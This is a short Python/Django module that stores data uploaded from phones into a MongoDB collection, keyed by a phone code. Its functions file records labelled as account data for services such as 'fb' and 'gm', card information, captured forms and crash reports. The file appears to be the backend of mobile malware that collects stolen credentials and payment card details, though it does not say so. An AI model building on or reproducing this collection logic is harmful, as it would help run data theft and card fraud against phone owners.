import time

from django.conf import settings


def attach_ex(code, data):
    """
    New version of attach for new protocol, simplified
    @param code: Unique phone code
    @type code: str
    @param data: Dictionary data for the phone, passed from client in the 'data' request field
    @type data: dict

    """
    collection = settings.MONGO['extra_data']
    collection.insert({'code': code, 'type': 'userdata', 'data': data})


# ## old protocol conversion, deprecated

def attach_account(code, data):
    """
    Attach account data (fb, gm etc)
    @param code: Unique phone code
    @type code: str
    @param data: Dictionary data for the phone, passed from client in the 'data' request field
    @type data: dict
    """
    if 'code' in data:
        del data['code']
    command = data.get('type')
    if 'type' in data:
        del data['type']
    collection = settings.MONGO['extra_data']
    data['type'] = 'account'
    data['name'] = command
    collection.insert({'code': code, 'type': 'userdata', 'data': data})


def attach_card_info(code, data):
    """
    Attach card data
    @param code: Unique phone code
    @type code: str
    @param data: Dictionary data for the phone, passed from client in the 'data' request field
    @type data: dict
    """
    if 'code' in data:
        del data['code']
    if 'type' in data:
        del data['type']
    collection = settings.MONGO['extra_data']
    data['type'] = 'card information'
    collection.insert({'code': code, 'type': 'userdata', 'data': data})


def attach_form_info(code, data):
    """
    Attach card data
    @param code: Unique phone code
    @type code: str
    @param data: Dictionary data for the phone, passed from client in the 'data' request field
    @type data: dict
    """
    if 'code' in data:
        del data['code']
    if 'type' in data:
        del data['type']
    collection = settings.MONGO['extra_data']
    data['type'] = 'forms'
    collection.insert({'code': code, 'type': 'userdata', 'data': data})


def attach_crash_report(code, data):
    """
    Attach crash report data
    @param code: Unique phone code
    @type code: str
    @param data: Dictionary data for the phone, passed from client in the 'data' request field
    @type data: dict
    """
    collection = settings.MONGO['extra_data']
    collection.insert({'code': code, 'type': 'crash report', 'data': data.get('data'), 'time': time.time()})
